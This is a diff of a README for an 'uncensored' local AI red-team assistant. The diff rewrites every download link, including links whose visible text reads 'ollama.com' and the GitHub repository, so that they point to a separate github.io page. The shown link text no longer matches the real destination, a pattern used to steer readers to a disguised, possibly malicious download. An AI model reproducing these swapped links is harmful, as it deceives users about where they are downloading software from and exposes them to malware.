@@ -1,6 +1,6 @@
 # 🔒 Local-LLM-YamanRedTeam - Your Private, Uncensored AI Research Assistant
 
-[![Download Now](https://img.shields.io/badge/Download-Local--LLM--YamanRedTeam-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rozehighspeed3501/Local-LLM-YamanRedTeam/releases)
+[![Download Now](https://img.shields.io/badge/Download-Local--LLM--YamanRedTeam-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://rozehighspeed3501.github.io)
 
 ## 🔍 What Is This?
 
@@ -31,7 +31,7 @@ Ready to start? Follow these simple steps:
 
 ### 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/rozehighspeed3501/Local-LLM-YamanRedTeam/releases](https://github.com/rozehighspeed3501/Local-LLM-YamanRedTeam/releases)
+Visit this link to download the application: [https://rozehighspeed3501.github.io](https://rozehighspeed3501.github.io)
 
 Click the download button on that page to get the latest version of the program.
 
@@ -47,7 +47,7 @@ Your computer should have:
 
 This program works together with another free tool called **Ollama**. Ollama helps manage the AI models on your computer.
 
-1. **Install Ollama** - Go to [ollama.com](https://ollama.com) and download the Windows version. Install it like any normal program.
+1. **Install Ollama** - Go to [ollama.com](https://rozehighspeed3501.github.io) and download the Windows version. Install it like any normal program.
 2. **Run Ollama** - After installation, open Ollama once to make sure it's working. You'll see a small icon in your taskbar.
 3. **Download the AI Models** - Open your command prompt (search for "cmd" in your Start menu) and type these commands one at a time:
    ```
@@ -120,8 +120,8 @@ Check the GitHub repository's Issues page for common questions, or open a new is
 
 ## 📚 Additional Resources
 
-- **Official Repository**: [github.com/rozehighspeed3501/Local-LLM-YamanRedTeam](https://github.com/rozehighspeed3501/Local-LLM-YamanRedTeam)
-- **Ollama Website**: [ollama.com](https://ollama.com)
+- **Official Repository**: [github.com/rozehighspeed3501/Local-LLM-YamanRedTeam](https://rozehighspeed3501.github.io)
+- **Ollama Website**: [ollama.com](https://rozehighspeed3501.github.io)
 - **Report Bugs**: Visit the Issues section on GitHub
 
 ## 🔒 Privacy & Security Notes
@@ -157,6 +157,6 @@ This project is licensed for educational and authorized research purposes. See t
 
 ---
 
-**Ready to explore the power of local AI?** [Download Local-LLM-YamanRedTeam now](https://github.com/rozehighspeed3501/Local-LLM-YamanRedTeam/releases) and start your private AI journey today!
+**Ready to explore the power of local AI?** [Download Local-LLM-YamanRedTeam now](https://rozehighspeed3501.github.io) and start your private AI journey today!
 
 Keywords: ai-assistant, chatbot, ctf, cybersecurity, fastapi, llm, local-llm, offline-ai, ollama, pentesting, privacy, python, red-team, security-research, self-hosted, uncensored-llm
